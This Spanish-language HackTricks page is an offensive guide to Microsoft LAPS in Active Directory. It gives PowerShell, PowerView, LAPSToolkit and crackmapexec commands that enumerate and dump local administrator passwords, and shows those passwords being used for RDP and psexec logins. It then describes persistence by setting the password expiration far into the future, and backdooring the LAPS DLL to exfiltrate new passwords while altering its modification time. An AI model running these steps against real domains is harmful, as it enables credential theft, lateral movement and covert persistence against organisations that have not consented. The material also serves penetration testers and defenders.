# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Información Básica

Local Administrator Password Solution (LAPS) es una herramienta utilizada para gestionar un sistema donde las **contraseñas de administrador**, que son **únicas, aleatorias y cambiadas con frecuencia**, se aplican a computadoras unidas al dominio. Estas contraseñas se almacenan de forma segura dentro de Active Directory y solo son accesibles para los usuarios que han recibido permiso a través de Listas de Control de Acceso (ACLs). La seguridad de las transmisiones de contraseñas del cliente al servidor se asegura mediante el uso de **Kerberos versión 5** y **Estándar de Cifrado Avanzado (AES)**.

En los objetos de computadora del dominio, la implementación de LAPS resulta en la adición de dos nuevos atributos: **`ms-mcs-AdmPwd`** y **`ms-mcs-AdmPwdExpirationTime`**. Estos atributos almacenan la **contraseña de administrador en texto claro** y **su tiempo de expiración**, respectivamente.

### Verificar si está activado
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### Acceso a la Contraseña LAPS

Puedes **descargar la política LAPS en bruto** desde `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` y luego usar **`Parse-PolFile`** del paquete [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) para convertir este archivo en un formato legible por humanos.

Además, los **cmdlets nativos de PowerShell de LAPS** se pueden usar si están instalados en una máquina a la que tenemos acceso:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** también se puede utilizar para averiguar **quién puede leer la contraseña y leerla**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

El [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilita la enumeración de LAPS con varias funciones.\
Una es analizar **`ExtendedRights`** para **todas las computadoras con LAPS habilitado.** Esto mostrará **grupos** específicamente **delegados para leer las contraseñas de LAPS**, que a menudo son usuarios en grupos protegidos.\
Una **cuenta** que ha **unido una computadora** a un dominio recibe `All Extended Rights` sobre ese host, y este derecho le da a la **cuenta** la capacidad de **leer contraseñas**. La enumeración puede mostrar una cuenta de usuario que puede leer la contraseña de LAPS en un host. Esto puede ayudarnos a **dirigirnos a usuarios específicos de AD** que pueden leer las contraseñas de LAPS.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Extracción de Contraseñas LAPS Con Crackmapexec**

Si no hay acceso a un powershell, puedes abusar de este privilegio de forma remota a través de LDAP utilizando
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
Esto volcará todas las contraseñas que el usuario puede leer, lo que te permitirá obtener una mejor posición con un usuario diferente.

## ** Usando la Contraseña de LAPS **
```
xfreerdp /v:192.168.1.1:3389  /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## **Persistencia de LAPS**

### **Fecha de Expiración**

Una vez que se tiene acceso de administrador, es posible **obtener las contraseñas** y **prevenir** que una máquina **actualice** su **contraseña** **estableciendo la fecha de expiración en el futuro**.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
> [!WARNING]
> La contraseña aún se restablecerá si un **admin** utiliza el **`Reset-AdmPwdPassword`** cmdlet; o si **No permitir que el tiempo de expiración de la contraseña sea más largo de lo requerido por la política** está habilitado en el GPO de LAPS.

### Backdoor

El código fuente original de LAPS se puede encontrar [aquí](https://github.com/GreyCorbel/admpwd), por lo tanto, es posible poner una puerta trasera en el código (dentro del método `Get-AdmPwdPassword` en `Main/AdmPwd.PS/Main.cs`, por ejemplo) que de alguna manera **exfiltre nuevas contraseñas o las almacene en algún lugar**.

Luego, solo compila el nuevo `AdmPwd.PS.dll` y súbelo a la máquina en `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (y cambia la hora de modificación).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)


{{#include ../../banners/hacktricks-training.md}}
